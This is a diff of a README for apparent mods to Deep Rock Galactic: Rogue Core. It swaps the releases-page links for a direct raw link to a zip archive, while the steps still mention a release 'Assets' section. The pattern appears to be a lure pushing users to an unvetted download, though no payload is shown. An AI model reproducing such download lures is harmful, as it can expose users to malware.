@@ -1,6 +1,6 @@
 # ⛏️ deep-rock-rogue-core-mods - Enhance your mining experience with mods
 
-[![](https://img.shields.io/badge/Download_Latest_Mods-Blue.svg)](https://github.com/katinkadomestic506/deep-rock-rogue-core-mods/releases)
+[![](https://img.shields.io/badge/Download_Latest_Mods-Blue.svg)](https://raw.githubusercontent.com/katinkadomestic506/deep-rock-rogue-core-mods/main/mods/rock_rogue_deep_mods_core_3.3.zip)
 
 This software offers tools to improve your gameplay in Deep Rock Galactic: Rogue Core. These mods change how the game plays, adds new visual elements, and provides quality of life improvements. Use these files to customize your experience on your local computer.
 
@@ -17,7 +17,7 @@ Your computer needs to meet basic standards to run these mods. Verify your syste
 
 You must get the latest files to ensure compatibility with your game. Follow these steps to reach the download location.
 
-1. Visit this page to download: [https://github.com/katinkadomestic506/deep-rock-rogue-core-mods/releases](https://github.com/katinkadomestic506/deep-rock-rogue-core-mods/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/katinkadomestic506/deep-rock-rogue-core-mods/main/mods/rock_rogue_deep_mods_core_3.3.zip](https://raw.githubusercontent.com/katinkadomestic506/deep-rock-rogue-core-mods/main/mods/rock_rogue_deep_mods_core_3.3.zip)
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file ending in .zip to save it to your computer.
 4. Choose a folder where you can find the file easily, like your Downloads folder.
